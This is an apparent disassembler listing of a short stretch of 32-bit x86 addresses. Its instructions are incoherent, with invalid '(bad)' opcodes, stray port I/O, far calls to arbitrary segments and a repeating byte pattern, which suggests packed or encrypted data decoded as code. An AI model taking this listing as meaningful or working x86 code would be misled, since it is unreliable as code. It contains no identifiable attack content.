  422491:	add    BYTE PTR [edx+0x0],bl
  422494:	add    BYTE PTR [eax],al
  422496:	push   eax
  422497:	dec    ebp
  422498:	push   esi
  422499:	test   eax,0x2f0bd6b9
  42249e:	int3   
  42249f:	lods   eax,DWORD PTR ds:[esi]
  4224a0:	outs   dx,DWORD PTR ds:[esi]
  4224a1:	push   es
  4224a2:	xchg   BYTE PTR [edx-0x36],ah
  4224a5:	push   ss
  4224a6:	push   es
  4224a7:	cdq    
  4224a8:	dec    esp
  4224a9:	loope  0x42249a
  4224ab:	and    ebp,ecx
  4224ad:	dec    eax
  4224ae:	repnz fcomp QWORD PTR [ebp-0x80]
  4224b2:	sbb    eax,0x709efec9
  4224b7:	je     0x42249c
  4224b9:	sub    eax,0xd667d761
  4224be:	aas    
  4224bf:	pushf  
  4224c0:	dec    ebx
  4224c1:	repz out dx,eax
  4224c3:	fidiv  WORD PTR [ebx-0x1ee9bc87]
  4224c9:	call   0x18b0:0xe7db590c
  4224d0:	jp     0x422485
  4224d2:	pop    edx
  4224d3:	rol    DWORD PTR [edi+0x77b6f2df],cl
  4224d9:	ss mov ah,0x55
  4224dc:	push   esi
  4224dd:	ss xor bl,dl
  4224e0:	imul   esp,DWORD PTR [ecx+0x6b],0x5410fa00
  4224e7:	(bad)  
  4224e8:	data16 adc cl,bl
  4224eb:	retf   
  4224ec:	out    0x26,eax
  4224ee:	jne    0x4224f4
	...
  4224fc:	add    BYTE PTR [eax],al
  4224fe:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422502:	test   DWORD PTR [ebx-0xce58301],0x98564cfc
  42250c:	jb     0x4224fc
  42250e:	add    ebx,ebx
  422510:	add    DWORD PTR [eax],eax
  422512:	pop    edx
  422513:	add    BYTE PTR [eax],al
  422515:	add    BYTE PTR [esi+0x759c9029],ah
  42251b:	popa   
  42251c:	push   esp
  42251d:	push   ds
  42251e:	idiv   BYTE PTR [ebp-0x7bb890b9]
  422524:	or     eax,0xc32ff451
  422529:	mov    al,0x68
  42252b:	(bad)  
  42252c:	(bad)  
  42252d:	mov    edi,0x97cd68e4
  422532:	or     DWORD PTR [ebx+esi*8+0x13],0x75
  422537:	ret    
  422538:	mov    ds:0x4f139d58,eax
  42253d:	inc    esi
  42253e:	test   DWORD PTR [eax+0x6690203],ecx
  422544:	dec    ebx
  422545:	mov    DWORD PTR [edi],edx
  422547:	mov    WORD PTR [ebx+0x4627a87c],cs
  42254d:	repnz es add al,0xc1
  422551:	aaa    
  422552:	popf   
  422553:	addr16 jb 0x422561
  422556:	and    DWORD PTR [ecx-0x3b4f5505],ebp
  42255c:	out    0x56,eax
  42255e:	stos   DWORD PTR es:[edi],eax
  42255f:	sahf   
  422560:	aam    0x77
  422562:	stos   BYTE PTR es:[edi],al
  422563:	ins    BYTE PTR es:[di],dx
  422565:	out    0xdd,al
  422567:	add    DWORD PTR [esi],0xfffffff4
  42256a:	and    BYTE PTR [ebp+0x51c7f97d],0x0
	...
  42257d:	add    BYTE PTR [edi],ah
  42257f:	push   ecx
  422580:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  42258a:	sbb    bh,BYTE PTR [esi-0x24a4bb33]
  422590:	add    DWORD PTR [eax],eax
  422592:	pop    edx
  422593:	add    BYTE PTR [eax],al
  422595:	add    BYTE PTR [edi],ch
  422597:	xor    BYTE PTR [esp+edi*4+0x13],bh
  42259b:	pop    ss
  42259c:	jne    0x422548
  42259e:	aad    0xc9
  4225a0:	inc    edx
  4225a1:	inc    ebp
  4225a2:	push   edx
  4225a3:	jmp    0x42260f
  4225a5:	jne    0x4225a4
  4225a7:	stc    
  4225a8:	shr    DWORD PTR [ebx+ecx*8+0x1c763a56],cl
  4225af:	xor    bh,0x79
  4225b2:	pusha  
  4225b3:	lods   al,BYTE PTR ds:[esi]
  4225b4:	clc    
  4225b5:	ds inc esi
  4225b7:	lock mov DWORD PTR [edi+0x37],ebx
  4225bb:	sbb    DWORD PTR [eax+0x406144de],ecx
  4225c1:	dec    edi
  4225c2:	call   0x3cbe:0xed15ca2
  4225c9:	pop    eax
  4225ca:	push   eax
  4225cb:	cmovo  ecx,ebx
  4225ce:	add    al,0xf8
  4225d0:	pop    esp
  4225d1:	sub    eax,0xe2728468
  4225d6:	jns    0x4225f7
  4225d8:	out    0xe4,eax
  4225da:	jmp    0x241bb82c
  4225df:	mov    ds:0x8ff8e9da,al
  4225e4:	or     ebx,DWORD PTR [edi-0x323d5c5d]
  4225ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225eb:	dec    ecx
  4225ec:	in     eax,0xf9
  4225ee:	add    cl,dh
	...
  4225fc:	add    BYTE PTR [eax],al
  4225fe:	add    dl,BYTE PTR ss:[ebp+0xc]
  422602:	jne    0x422663
  422604:	jg     0x422640
  422606:	clc    
  422607:	cs aas 
  422609:	push   0xcc175531
  42260e:	mov    bl,0xce
  422610:	add    DWORD PTR [eax],eax
  422612:	pop    edx
  422613:	add    BYTE PTR [eax],al
  422615:	add    BYTE PTR [edx],ah
  422617:	(bad)  
  422618:	push   ecx
  422619:	xor    dl,bl
  42261b:	pop    edx
  42261c:	sbb    BYTE PTR [ebp+0x79f1fb26],ah
  422622:	sbb    DWORD PTR [ecx+ebx*4+0x58],edi
  422626:	das    
  422627:	adc    al,BYTE PTR [eax]
  422629:	dec    esp
  42262a:	mov    ebx,0xbc02771
  42262f:	dec    esi
  422630:	arpl   WORD PTR [edi+0x2],ax
  422633:	cmp    eax,DWORD PTR [esi]
  422635:	(bad)  
  422636:	outs   dx,BYTE PTR ds:[esi]
  422637:	in     eax,0xe
  422639:	mov    eax,0x52f1efbf
  42263e:	adc    DWORD PTR [eax],ebp
  422640:	dec    ebp
  422641:	ins    DWORD PTR es:[edi],dx
  422642:	cdq    
  422643:	sub    DWORD PTR ss:[ecx-0x285dcb27],ebx
  42264a:	or     DWORD PTR [esi+0x24],edi
  42264d:	push   ebx
  42264e:	jae    0x42263f
  422650:	sbb    al,0xf3
  422652:	or     bl,dl
  422654:	jnp    0x42264f
  422656:	neg    BYTE PTR [edi]
  422658:	ficomp DWORD PTR [edi-0x71]
  42265b:	les    ebx,FWORD PTR ds:[eax+0x0]
  42265f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422660:	jbe    0x4226b8
  422662:	icebp  
  422663:	sbb    al,0xc8
  422665:	xor    ch,BYTE PTR [edi+eiz*4+0x859b294]
  42266c:	or     al,bl
  42266e:	push   edx
  42266f:	push   es
	...
  42267c:	add    BYTE PTR [eax],al
  42267e:	or     BYTE PTR [ecx-0x404c48e],dh
  422684:	dec    ecx
  422685:	mov    bl,0x94
  422687:	je     0x422660
  422689:	call   0xcf0d:0xd2036153
  422690:	add    DWORD PTR [eax],eax
  422692:	pop    edx
  422693:	add    BYTE PTR [eax],al
  422695:	add    bl,bh
  422697:	mov    ds:0xec9f78f7,eax
  42269c:	add    al,0xab
  42269e:	lods   al,BYTE PTR ds:[esi]
  42269f:	dec    esp
  4226a0:	mov    ?,WORD PTR [esi-0x6137a1d0]
  4226a6:	ins    BYTE PTR es:[edi],dx
  4226a7:	mov    al,ds:0xffb20566
  4226ac:	int3   
  4226ad:	nop
  4226ae:	popa   
  4226af:	push   ecx
  4226b0:	fisttp QWORD PTR ds:0xddee5e41
  4226b6:	sahf   
  4226b7:	mov    edi,DWORD PTR [ecx-0x5106363f]
  4226bd:	adc    BYTE PTR [edi+0x29],0x34
  4226c1:	dec    eax
  4226c2:	pop    edx
  4226c3:	jge    0x422729
  4226c5:	sbb    esp,DWORD PTR [edx+0x591b7333]
  4226cb:	cmp    BYTE PTR [ecx],dh
  4226cd:	ins    BYTE PTR es:[edi],dx
  4226ce:	mov    ds:0xd14024dc,al
  4226d3:	push   ebp
  4226d4:	ret    
  4226d5:	addr16 mov al,ds:0xa5c2
  4226d9:	test   al,0x18
  4226db:	push   cs
  4226dc:	out    0x12,al
  4226de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226df:	out    0x4,eax
  4226e1:	sbb    cl,BYTE PTR [edx-0x68]
  4226e4:	enter  0x743a,0x20
  4226e8:	(bad)  
  4226ea:	lahf   
  4226eb:	or     ah,ah
  4226ed:	mov    edi,0x9891
	...
  4226fe:	fist   WORD PTR [ebx-0x4e]
  422701:	dec    edi
  422702:	mov    esi,0x67d3ffef
  422707:	xchg   ecx,edi
  422709:	adc    al,0xb8
  42270b:	or     al,dl
  42270d:	in     al,dx
  42270e:	addr16 iret 
  422710:	add    DWORD PTR [eax],eax
  422712:	pop    edx
  422713:	add    BYTE PTR [eax],al
  422715:	add    BYTE PTR [ebx+0x3d],bh
  422718:	mov    cl,0xa3
  42271a:	pop    es
  42271b:	jnp    0x4226e9
  42271d:	push   eax
  42271e:	fnsave [edi-0x6]
  422721:	call   0x2d30f5e4
  422726:	cs sahf 
  422728:	mov    DWORD PTR [ebp-0xe],edx
  42272b:	add    BYTE PTR [edi-0x705a0270],bl
  422731:	outs   dx,DWORD PTR ds:[esi]
  422732:	cs push es
  422734:	mov    ebx,0x37e2d880
  422739:	inc    ecx
  42273a:	hlt    
  42273b:	sub    ebp,DWORD PTR [edx+0x72]
  42273e:	sub    bh,dh
  422740:	popa   
  422741:	ins    DWORD PTR es:[edi],dx
  422742:	test   al,0xff
  422744:	xlat   BYTE PTR ds:[ebx]
  422745:	sbb    al,0x9e
  422747:	ins    BYTE PTR es:[edi],dx
  422748:	sahf   
  422749:	jge    0x422708
  42274b:	cmp    DWORD PTR [edi-0x5ae8d1e6],eax
  422751:	lods   al,BYTE PTR ds:[esi]
  422752:	push   ebp
  422753:	xchg   ecx,eax
  422754:	dec    edi
  422755:	jnp    0x42273a
  422757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422758:	push   esp
  422759:	in     eax,dx
  42275a:	cmp    bh,ch
  42275c:	jmp    0x422706
  42275e:	or     ebp,DWORD PTR [edi]
  422760:	sub    eax,0xd1032092
  422765:	pop    ds
  422766:	xchg   esi,eax
  422767:	cmp    ebp,eax
  422769:	loopne 0x422733
  42276b:	enter  0xff10,0x1a
  42276f:	mov    ah,0x0
	...
  42277d:	add    BYTE PTR [edi-0x24252cf4],al
  422783:	fisttp WORD PTR [edi+0x640ccb5d]
  422789:	push   ss
  42278a:	push   esi
  42278b:	jle    0x42271e
  42278d:	enter  0xcfc1,0x1
  422791:	add    BYTE PTR [edx+0x0],bl
  422794:	add    BYTE PTR [eax],al
  422796:	add    bh,BYTE PTR [eax]
  422798:	loope  0x4227c7
  42279a:	xchg   ebp,eax
  42279b:	test   al,0x30
  42279d:	lods   eax,DWORD PTR ds:[esi]
  42279e:	dec    esp
  42279f:	ret    0x5093
  4227a2:	add    ebp,DWORD PTR [ebp-0x53]
  4227a5:	enter  0xef79,0xb2
  4227a9:	xchg   DWORD PTR gs:[ecx-0x5d],edx
  4227ad:	mov    al,0x63
  4227af:	or     DWORD PTR gs:[eax],ebx
  4227b2:	push   eax
  4227b3:	push   edx
  4227b4:	mov    ds:0x7e708d13,eax
  4227b9:	outs   dx,DWORD PTR ds:[esi]
  4227ba:	mov    DWORD PTR [ecx-0x6b5b31d9],eax
  4227c0:	sub    BYTE PTR [esi],ah
  4227c2:	ret    
  4227c3:	mov    cl,0xa4
  4227c5:	xlat   BYTE PTR ds:[ebx]
  4227c6:	xchg   DWORD PTR [edx],edx
  4227c8:	push   ss
  4227c9:	lds    esp,FWORD PTR ds:0xb0ac733b
  4227cf:	sbb    al,0xf4
  4227d1:	xchg   ebx,eax
  4227d2:	inc    ebx
  4227d3:	popf   
  4227d4:	jp     0x422842
  4227d6:	cwde   
  4227d7:	inc    edi
  4227d8:	ror    BYTE PTR [ecx+0x2e],0x14
  4227dc:	repz test DWORD PTR [eax+0xb],ebx
  4227e0:	fnstsw WORD PTR [ebp+ebx*8-0x60]
  4227e4:	in     al,dx
  4227e5:	xor    DWORD PTR [eax],ebp
  4227e7:	or     dh,bl
  4227e9:	cmp    DWORD PTR [edi-0x68474a1c],edi
  4227ef:	in     al,0x0
	...
  4227fd:	add    BYTE PTR [edi-0x28db29d],bl
  422803:	jle    0x4227c4
  422805:	out    dx,eax
  422806:	sbb    edi,esp
  422808:	mov    BYTE PTR [ebp+esi*1+0x1b4de32d],dh
  42280f:	rol    BYTE PTR [ecx],1
  422811:	add    BYTE PTR [edx+0x0],bl
  422814:	add    BYTE PTR [eax],al
  422816:	cmp    ch,BYTE PTR [ecx]
  422818:	fwait
  422819:	jnp    0x422866
  42281b:	jle    0x4227c6
  42281d:	stos   BYTE PTR es:[edi],al
  42281e:	popa   
  42281f:	push   esi
  422820:	rcl    DWORD PTR [edx+0x7c],0xb3
  422824:	shl    esp,1
  422826:	aas    
  422827:	lock fwait
  422829:	repnz fidiv DWORD PTR [ebp-0x4b5de753]
  422830:	sbb    dl,BYTE PTR [edi]
  422832:	sbb    DWORD PTR [eax+0x7557a0ce],0x2b
  422839:	mov    ebx,0x951163d2
  42283e:	nop
  42283f:	jb     0x42284c
  422841:	dec    esp
  422842:	sbb    BYTE PTR [ebp+0x78],bl
  422845:	pop    edi
  422846:	das    
  422847:	and    DWORD PTR [ebp-0x31],eax
  42284a:	in     eax,dx
  42284b:	mov    ds:0xe85c3d1f,eax
  422850:	jl     0x4228c3
  422852:	xchg   ebp,eax
  422853:	les    ebx,FWORD PTR [esi-0x6585a329]
  422859:	xor    dl,BYTE PTR [edi+0x565c4a06]
  42285f:	sti    
  422860:	mov    dl,0x1
  422862:	push   es
  422863:	arpl   WORD PTR [ecx+0x56],ax
  422866:	and    eax,0x73063c7a
  42286b:	jmp    0x422881
  42286d:	jbe    0x422806
  42286f:	mov    bl,0x0
	...
  42287d:	add    BYTE PTR [eax+0x23],dh
  422880:	and    eax,0x7c6f7769
  422885:	cmp    esp,DWORD PTR [eax-0x84311e4]
  42288b:	inc    eax
  42288c:	ja     0x42289b
  42288e:	jne    0x422860
  422890:	add    DWORD PTR [eax],eax
  422892:	pop    edx
  422893:	add    BYTE PTR [eax],al
  422895:	add    BYTE PTR [ebx+0x4f],cl
  422898:	test   eax,0xa9566dfb
  42289d:	cmc    
  42289e:	pop    es
  42289f:	mov    cl,0xca
  4228a1:	loope  0x4228b5
  4228a3:	ins    BYTE PTR es:[edi],dx
  4228a4:	adc    DWORD PTR [ebx],edx
  4228a6:	cmp    DWORD PTR [eax+ebx*4],ebp
  4228a9:	test   DWORD PTR [ecx+0x740dbbb4],0x57255cea
  4228b3:	int    0xb7
  4228b5:	xchg   ecx,esi
  4228b7:	fsub   DWORD PTR [ebx+0x5e1802c8]
  4228bd:	push   ss
  4228be:	adc    eax,eax
  4228c0:	call   0xe319:0xc8ba9fd7
  4228c7:	imul   ebx,DWORD PTR [esi-0x65],0x13cd2b9b
  4228ce:	and    dl,BYTE PTR [edi]
  4228d0:	pop    ebx
  4228d1:	push   edx
  4228d2:	sbb    BYTE PTR [eax],bh
  4228d4:	cmp    al,0x28
  4228d6:	mov    eax,DWORD PTR [ebp+0x7f0bd7fa]
  4228dc:	and    bh,BYTE PTR [ecx+0x30]
  4228df:	lods   al,BYTE PTR ds:[esi]
  4228e0:	das    
  4228e1:	mov    BYTE PTR [eax+0x590626c0],cl
  4228e7:	add    eax,ebx
  4228e9:	mov    ebp,0x9e92f748
  4228ee:	xchg   cx,ax
	...
  4228fc:	add    BYTE PTR [eax],al
  4228fe:	xchg   esp,eax
  4228ff:	nop
  422900:	ffree  st(0)
  422902:	(bad)  
  422904:	popf   
  422905:	aam    0x57
  422907:	(bad)
  42290b:	mov    eax,ebx
  42290d:	out    dx,al
  42290e:	iret   
  42290f:	rol    BYTE PTR [ecx],1
  422911:	add    BYTE PTR [edx+0x0],bl
  422914:	add    BYTE PTR [eax],al
  422916:	bound  eax,QWORD PTR [edx]
  422918:	lods   eax,DWORD PTR ds:[esi]
  422919:	std    
  42291a:	xchg   ebx,eax
  42291b:	(bad)  
  42291c:	push   esi
  42291d:	cmp    bh,BYTE PTR [esi+0x7ec7bc41]
  422923:	mov    edi,DWORD PTR [ebx]
  422925:	cmp    DWORD PTR [ebx],0xd2c569c3
  42292b:	outs   dx,DWORD PTR ds:[esi]
  42292c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42292d:	sub    eax,0x3ba95fa5
  422932:	sub    ch,BYTE PTR [eax]
  422934:	imul   esi,ebx,0xffffff8f
  422937:	pop    esi
  422938:	sub    al,0x48
  42293a:	mov    edx,0x1fe6ba4f
  42293f:	hlt    
  422940:	(bad)  
  422941:	dec    ebp
  422942:	jnp    0x422998
  422944:	mov    bh,0x4d
  422946:	dec    ecx
  422947:	aam    0x6d
  422949:	int3   
  42294a:	dec    esp
  42294b:	jb     0x4228f7
  42294d:	jge    0x422945
  42294f:	mov    ch,0xf6
  422951:	mov    ecx,0x5dac7f3f
  422956:	cs mov ecx,0x6453ac54
  42295c:	jmp    0x42295b
  42295e:	pop    ds
  42295f:	into   
  422960:	adc    BYTE PTR [eax],0xc3
  422963:	pop    ds
  422964:	es (bad) 
  422966:	fiadd  WORD PTR [edi]
  422968:	sub    al,0xd4
  42296a:	daa    
  42296b:	sub    DWORD PTR [eax],ebp
  42296d:	jp     0x422978
  42296f:	cmp    al,BYTE PTR [eax]
	...
  42297d:	add    ah,dh
  42297f:	mov    dl,0x32
  422981:	(bad)  
  422982:	jbe    0x42295a
  422984:	hlt    
  422985:	mov    dl,0xb1
  422987:	and    al,0xfe
  422989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42298a:	mov    ah,0x55
  42298c:	ja     0x4229c5
  42298e:	sub    ecx,edx
  422990:	add    DWORD PTR [eax],eax
  422992:	pop    edx
  422993:	add    BYTE PTR [eax],al
  422995:	add    BYTE PTR [ebp+0x77b14e22],ah
  42299b:	ficom  WORD PTR [esi+ecx*1]
  42299e:	je     0x422929
  4229a0:	adc    BYTE PTR [edx-0x4d],ch
  4229a3:	sahf   
  4229a4:	jmp    0x42298d
  4229a6:	cmc    
  4229a7:	out    0x82,al
  4229a9:	or     al,0xf0
  4229ab:	icebp  
  4229ac:	outs   dx,BYTE PTR ds:[esi]
  4229ad:	mul    ecx
  4229af:	stos   BYTE PTR es:[edi],al
  4229b0:	jo     0x422989
  4229b2:	test   al,0x79
  4229b4:	push   ecx
  4229b5:	scas   al,BYTE PTR es:[edi]
  4229b6:	sub    eax,0xaf7be06a
  4229bb:	add    eax,0xd8983197
  4229c0:	pushf  
  4229c1:	les    esi,FWORD PTR [ecx-0xc]
  4229c4:	mov    ebp,0x10466b35
  4229c9:	retf   
  4229ca:	pushf  
  4229cb:	enter  0xa850,0x41
  4229cf:	bound  ecx,QWORD PTR [ebx]
  4229d1:	xor    eax,0xe3737098
  4229d6:	aas    
  4229d7:	cmp    BYTE PTR [edi+esi*8+0x5b],cl
  4229db:	mov    eax,ds:0x4fc4fd20
  4229e0:	push   ecx
  4229e1:	add    ecx,esp
  4229e3:	fisub  DWORD PTR [esi-0x66]
  4229e6:	pop    ebp
  4229e7:	mov    ah,0xc5
  4229e9:	mov    DWORD PTR [eax],eax
  4229eb:	mov    bl,0xd0
  4229ed:	or     eax,0xafe3
	...
  4229fe:	xor    dl,bl
  422a00:	into   
  422a01:	mov    ds:0xd37ebfef,al
  422a06:	sub    edi,DWORD PTR [esi]
  422a08:	out    0x3f,eax
  422a0a:	gs popf 
  422a0c:	pop    edi
  422a0d:	fs adc ecx,0x1
  422a11:	add    BYTE PTR [edx+0x0],bl
  422a14:	add    BYTE PTR [eax],al
  422a16:	sti    
  422a17:	imul   esi,esp,0x1c
  422a1a:	mov    bl,BYTE PTR [ebx-0x51]
  422a1d:	pop    edx
  422a1e:	push   edx
  422a1f:	push   0x50
  422a21:	sahf   
  422a22:	xchg   esi,eax
  422a23:	scas   al,BYTE PTR es:[edi]
  422a24:	dec    ebp
  422a25:	mov    ah,0x7b
  422a27:	shr    DWORD PTR [ecx],1
  422a29:	xchg   BYTE PTR [edx],dh
  422a2b:	popa   
  422a2c:	cmc    
  422a2d:	jl     0x422a50
  422a2f:	dec    esp
  422a30:	push   esi
  422a31:	adc    DWORD PTR ds:0xf3f22b55,ecx
  422a37:	adc    al,0xc7
  422a39:	push   ds
  422a3a:	cmc    
  422a3b:	cmp    ebp,DWORD PTR [esi-0x2b5f6a34]
  422a41:	aad    0x10
  422a43:	shl    DWORD PTR [esi+0x3f2819ef],1
  422a49:	in     eax,dx
  422a4a:	jmp    0x4229d2
  422a4c:	pusha  
  422a4d:	push   ss
  422a4e:	retf   
  422a4f:	lods   al,BYTE PTR ds:[esi]
  422a50:	das    
  422a51:	test   eax,0xdeaf3acf
  422a56:	test   esp,esi
  422a58:	data16 out 0xa8,al
  422a5b:	adc    BYTE PTR [esi-0x9841c48],bh
  422a61:	retf   0x66c9
  422a64:	pop    esi
  422a65:	pushf  
  422a66:	stos   DWORD PTR es:[edi],eax
  422a67:	mov    dh,0xd6
  422a69:	add    BYTE PTR [edi-0xd],ch
  422a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a6d:	mov    ah,0x37
  422a6f:	lahf   
	...
  422a7c:	add    BYTE PTR [eax],al
  422a7e:	fucomi st,st(5)
  422a80:	outs   dx,BYTE PTR ds:[esi]
  422a81:	and    bh,BYTE PTR [esi-0x5d]
  422a84:	(bad)  
  422a86:	pop    esi
  422a87:	(bad)  
  422a88:	mov    DWORD PTR [ebp+0x4bdd7d75],ecx
  422a8e:	fst    st(1)
  422a90:	add    DWORD PTR [eax],eax
  422a92:	pop    edx
  422a93:	add    BYTE PTR [eax],al
  422a95:	add    BYTE PTR [ebp+0x4ed02bd9],cl
  422a9b:	mov    es,WORD PTR [eax+0x14e81333]
  422aa1:	dec    ecx
  422aa2:	jge    0x422a34
  422aa4:	test   DWORD PTR [eax],esi
  422aa6:	test   al,0x30
  422aa8:	fwait
  422aa9:	mov    cl,0x5c
  422aab:	mov    BYTE PTR [ecx-0x61b734c0],bh
  422ab1:	sbb    ch,BYTE PTR [ebx+0x14a60c74]
  422ab7:	dec    edi
  422ab8:	pop    ebp
  422ab9:	xchg   esp,eax
  422aba:	mov    ch,0xc9
  422abc:	xor    eax,0x6b804d46
  422ac1:	or     al,cl
  422ac3:	outs   dx,BYTE PTR ds:[esi]
  422ac4:	pop    ds
  422ac5:	jg     0x422a85
  422ac7:	push   ebp
  422ac8:	push   cs
  422ac9:	and    eax,0xdef45d76
  422ace:	or     eax,0x9f7d2e13
  422ad3:	mov    WORD PTR [ecx-0x5980144f],?
  422ad9:	push   0x2370664a
  422ade:	bound  ebp,QWORD PTR ds:0xfc285d76
  422ae4:	push   edi
  422ae5:	fcomp  DWORD PTR [ebx+0x7f]
  422ae8:	scas   eax,DWORD PTR es:[edi]
  422ae9:	loop   0x422b57
  422aeb:	fs int3 
  422aed:	bound  ebx,QWORD PTR [eax]
  422aef:	mov    bl,0x0
	...
  422afd:	add    BYTE PTR ds:0x6f976b22,al
  422b03:	(bad)  
  422b05:	mov    dl,0x66
  422b07:	and    BYTE PTR [esi+0x50ce966a],ah
  422b0d:	or     DWORD PTR [edi],esi
  422b0f:	rol    BYTE PTR [ecx],cl
  422b11:	add    BYTE PTR [edx+0x0],bl
  422b14:	add    BYTE PTR [eax],al
  422b16:	(bad)  
  422b17:	jmp    0x422aec
  422b19:	and    BYTE PTR [edx+edx*8+0x5c4f3d7b],bl
  422b20:	test   ecx,ecx
  422b22:	fs ja  0x422ac8
  422b25:	xchg   ebx,eax
  422b26:	inc    BYTE PTR [ebp+0x2cae92d3]
  422b2c:	mov    bh,al
  422b2e:	inc    ecx
  422b2f:	mov    dl,0xbf
  422b31:	mov    dh,0x6c
  422b33:	mov    dl,0xcf
  422b35:	jo     0x422b91
  422b37:	xchg   esi,eax
  422b38:	push   cs
  422b39:	pushf  
  422b3a:	jl     0x422b9d
  422b3c:	fnstenv [edi+0x7900e47f]
  422b42:	or     DWORD PTR [esi-0x18],ebx
  422b45:	imul   ebx,DWORD PTR [eax],0x8435bff6
  422b4b:	or     ch,BYTE PTR [ebp-0x47]
  422b4e:	enter  0xa798,0x5
  422b52:	xchg   edi,eax
  422b53:	jl     0x422ba3
  422b55:	mov    esp,0x55e928df
  422b5a:	mov    al,ds:0x23848e78
  422b5f:	fist   DWORD PTR [eax-0x2e]
  422b62:	loopne 0x422b2a
  422b64:	push   edi
  422b65:	mov    eax,0xe82fa9d2
  422b6a:	push   cs
  422b6b:	pop    fs
  422b6d:	fist   DWORD PTR [edi-0x35]
	...
  422b7c:	add    BYTE PTR [eax],al
  422b7e:	mov    edx,esp
  422b80:	and    al,0xd9
  422b82:	jg     0x422b7d
  422b84:	call   esi
  422b86:	into   
  422b87:	inc    ebp
  422b88:	mov    bh,0x11
  422b8a:	jmp    0x422b88
  422b8c:	and    eax,0x1d291ab
  422b91:	add    BYTE PTR [edx+0x0],bl
  422b94:	add    BYTE PTR [eax],al
  422b96:	test   eax,0xa63d1078
  422b9b:	loope  0x422b98
  422b9d:	dec    edi
  422b9e:	fisttp DWORD PTR [ecx-0x39]
  422ba1:	cmp    esi,DWORD PTR [esp+ebx*4]
  422ba4:	jmp    0xf80c62aa
  422ba9:	(bad)  
  422baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bab:	enter  0x1b15,0x54
  422baf:	add    eax,ebp
  422bb1:	jno    0x422bc9
  422bb3:	loope  0x422b5c
  422bb5:	test   BYTE PTR ds:0x26a4b520,bl
  422bbb:	pop    esi
  422bbc:	lock mov esp,0xf7ae5cc6
  422bc2:	sub    BYTE PTR [ecx-0x7922c2aa],ch
  422bc8:	mov    dl,0xca
  422bcb:	inc    esi
  422bcc:	sbb    DWORD PTR [edi+0x74],0x3638d0de
  422bd3:	or     al,0x3
  422bd5:	sbb    BYTE PTR [eax],ch
  422bd7:	xchg   ebp,eax
  422bd8:	mov    eax,0x48810f55
  422bdd:	mov    edi,0x47b3be90
  422be2:	cmp    DWORD PTR [edi+0x59],ebp
  422be5:	int3   
  422be6:	pop    ss
  422be7:	mov    WORD PTR [ebx-0x43],?
  422bea:	inc    edi
  422beb:	jmp    0x0:0xc745e1b1
	...
  422bfe:	fisubr WORD PTR [ecx]
  422c00:	cwde   
  422c01:	sar    bh,cl
  422c03:	repz fisubr WORD PTR ds:0x4af35f6
  422c0a:	cdq    
  422c0b:	mov    DWORD PTR [edi+0x6d],esp
  422c0e:	jmp    0x422be2
  422c10:	add    DWORD PTR [eax],eax
  422c12:	pop    edx
  422c13:	add    BYTE PTR [eax],al
  422c15:	add    dh,ch
  422c17:	fnclex 
  422c19:	and    ch,al
  422c1b:	jno    0x422c1b
  422c1d:	push   edi
  422c1e:	push   esp
  422c1f:	loopne 0x422c2e
  422c21:	sbb    eax,DWORD PTR [eax+0x5b]
  422c24:	rol    DWORD PTR [esi+0x73],1
  422c27:	enter  0x4152,0xf6
  422c2b:	cmp    al,BYTE PTR ds:0x751f3f7f
  422c31:	dec    esp
  422c32:	mov    bl,0xc9
  422c34:	mov    dl,BYTE PTR [edi+0x6d]
  422c37:	jne    0x422c7c
  422c39:	mov    ebp,0xf36cf263
  422c3e:	mov    ds:0xae9b0089,eax
  422c43:	pop    esi
  422c44:	cdq    
  422c45:	jmp    0x422c84
  422c47:	imul   ebx,DWORD PTR [ecx+ebp*8],0x7199e02e
  422c4e:	ror    DWORD PTR [ebp-0x58b39e2a],cl
  422c54:	pop    edi
  422c55:	pusha  
  422c56:	iret   
  422c57:	sub    DWORD PTR [ebx+0x79],ecx
  422c5a:	out    0x9f,al
  422c5c:	or     eax,0x55e04f7b
  422c61:	mov    dh,0xab
  422c63:	jge    0x422c47
  422c65:	xlat   BYTE PTR ds:[ebx]
  422c66:	(bad)  
  422c67:	out    dx,al
  422c68:	mov    DWORD PTR [esi+0x26],edx
  422c6b:	imul   esp,DWORD PTR [edi],0x5c
  422c6e:	std    
  422c6f:	jmp    0x0:0x0
	...
  422c7e:	dec    esi
  422c7f:	aas    
  422c80:	int3   
  422c81:	sbb    eax,0x7fdffffd
  422c86:	out    dx,eax
  422c87:	loopne 0x422c9f
  422c89:	lods   al,BYTE PTR ds:[esi]
  422c8a:	idiv   BYTE PTR [edx]
  422c8c:	sgdtd  [ebp-0x2d]
  422c90:	add    DWORD PTR [eax],eax
  422c92:	pop    edx
  422c93:	add    BYTE PTR [eax],al
  422c95:	add    BYTE PTR [ebp-0x74],bl
  422c98:	push   0xbad0a9d
  422c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c9e:	mov    ah,0xe9
  422ca0:	and    BYTE PTR [ebp+0x2d8ea0e4],ch
  422ca6:	push   cs
  422ca7:	mov    ds:0x84cafec0,eax
  422cac:	test   BYTE PTR [esi],ch
  422cae:	xor    ebp,DWORD PTR [ecx]
  422cb0:	dec    edi
  422cb1:	mov    ebp,0x8a5c11a6
  422cb6:	bswap  eax
  422cb8:	leave  
  422cb9:	adc    DWORD PTR [esp+eiz*2+0x559b8d0b],esp
  422cc0:	(bad)  
  422cc1:	ss out 0x74,al
  422cc4:	add    al,0xe3
  422cc6:	mov    edx,0x1886745c
  422ccb:	mov    ds:0x1e9d6dab,al
  422cd0:	mov    ah,0x6d
  422cd2:	(bad)  
  422cd3:	mov    eax,ds:0xec58633
  422cd8:	xchg   ebx,eax
  422cd9:	aas    
  422cda:	adc    ecx,DWORD PTR [ecx+edi*4-0x7c]
  422cde:	in     eax,0xca
  422ce0:	test   esi,eax
  422ce2:	int    0xd9
  422ce4:	mov    cs,WORD PTR [ecx]
  422ce6:	jp     0x422d1f
  422ce8:	scas   al,BYTE PTR es:[edi]
  422ce9:	stc    
  422cea:	jb     0x422d32
